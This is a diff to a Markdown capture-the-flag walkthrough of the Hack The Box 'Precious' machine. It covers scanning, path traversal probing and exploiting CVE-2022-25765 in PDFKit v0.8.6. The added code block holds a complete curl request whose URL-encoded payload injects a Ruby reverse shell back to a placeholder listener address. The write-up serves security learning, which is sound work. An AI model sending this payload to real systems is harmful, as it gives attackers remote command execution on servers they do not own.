@@ -6,7 +6,7 @@ The initial phase involves conducting a comprehensive network scan to enumerate 
 No alt text provided for this image
 Nmap Scan showing ports 22:80
 
-Upon completion of the scan, it was discovered that port 80 was hosting a web page accessible via the URL http://precious.htb/. In order to access the site, it will be necessary to add the aforementioned URL to the /etc/hosts file.
+Upon completion of the scan, it was discovered that port 80 was hosting a web page accessible via the URL `http://precious.htb/`. In order to access the site, it will be necessary to add the aforementioned URL to the `/etc/hosts` file.
 
 No alt text provided for this image
 http://precious.htb/
@@ -14,7 +14,7 @@ http://precious.htb/
 No alt text provided for this image
 Adding IP to URL in /etc/hosts file
 
-Following the successful addition of the IP address and URL to the /etc/hosts file, I was able to gain access to the fully functional website. This enabled me to commence with the penetration testing phase, during which I will identify potential vulnerabilities and determine exploitability.
+Following the successful addition of the IP address and URL to the `/etc/hosts` file, I was able to gain access to the fully functional website. This enabled me to commence with the penetration testing phase, during which I will identify potential vulnerabilities and determine exploitability.
 
 No alt text provided for this image
 The main webpage
@@ -22,7 +22,7 @@ The main webpage
 No alt text provided for this image
 Page source of URL
 
-The website features a search function that can be accessed via a specific URL. Upon testing the functionality, I discovered that it was possible to use various characters including <, >, /../ to manipulate the URL and gain access to sensitive content. Specifically, I was able to obtain a PDF page.
+The website features a search function that can be accessed via a specific URL. Upon testing the functionality, I discovered that it was possible to use various characters including `<, >, /../` to manipulate the URL and gain access to sensitive content. Specifically, I was able to obtain a PDF page.
 
 No alt text provided for this image
 Traversal Methods 1
@@ -48,10 +48,13 @@ No alt text provided for this image
 Bug Report
 
 Upon further investigation of Bug 1214658, I discovered that it was related to the Chrome browser and the website's API. However, I did not delve any deeper into this bug at this time. Further analysis of this bug may reveal additional vulnerabilities that could be exploited, and it may be worthwhile to revisit this issue in the future to assess its potential impact on the target system's security.
+
 After successfully accessing the PDF page using the path traversal vulnerability, I attempted to view the page source and accessed the console to investigate the error message that had been encountered earlier. Through this process, I was able to identify the version of PDFKIT being used on the website.
 
-After identifying the (CVE-2022-25765) vulnerability in PDFKIT v0.8.6, I exploited it by injecting a malicious code snippet into the website. To accomplish this, I set up a Python 3 HTTP server and a Netcat listener to receive the reverse shell connection. Then, using the 'curl' command in the terminal on Linux, I sent the payload containing the code snippet to the website. This allowed me to gain remote access to the target system and execute arbitrary commands through the reverse shell connection.
+After identifying the [(CVE-2022-25765)](https://github.com/PurpleWaveIO/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell) vulnerability in PDFKIT v0.8.6, I exploited it by injecting a malicious code snippet into the website. To accomplish this, I set up a Python 3 HTTP server and a Netcat listener to receive the reverse shell connection. Then, using the 'curl' command in the terminal on Linux, I sent the payload containing the code snippet to the website. This allowed me to gain remote access to the target system and execute arbitrary commands through the reverse shell connection.
+```
 curl 'TARGET-URL' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: TARGET_URL' -H 'Connection: keep-alive' -H 'Referer: TARGET_URL' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2FLOCAL-IP%3ALOCAL-HTTP-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-IP%22%2CLOCAL-LISTEN-PORT%29%29%27%60'
+```
 
 No alt text provided for this image
 Python3 -m http.server for Ruby script
